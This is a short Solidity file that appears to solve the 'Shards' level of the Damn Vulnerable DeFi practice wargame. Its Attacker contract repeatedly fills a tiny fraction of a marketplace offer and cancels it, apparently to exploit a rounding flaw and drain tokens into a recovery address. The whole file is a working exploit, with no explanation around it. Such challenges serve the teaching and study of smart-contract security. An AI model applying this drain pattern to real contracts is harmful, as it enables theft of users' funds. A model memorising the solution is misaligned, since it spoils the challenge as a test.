// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {
    ShardsNFTMarketplace, DamnValuableToken
} from "../../src/shards/ShardsNFTMarketplace.sol";
contract Attacker {
    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
        for (uint256 i = 0; i < 7519; i++) {
            marketplace.fill(1, 133);
            marketplace.cancel(1, i);
        }
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}

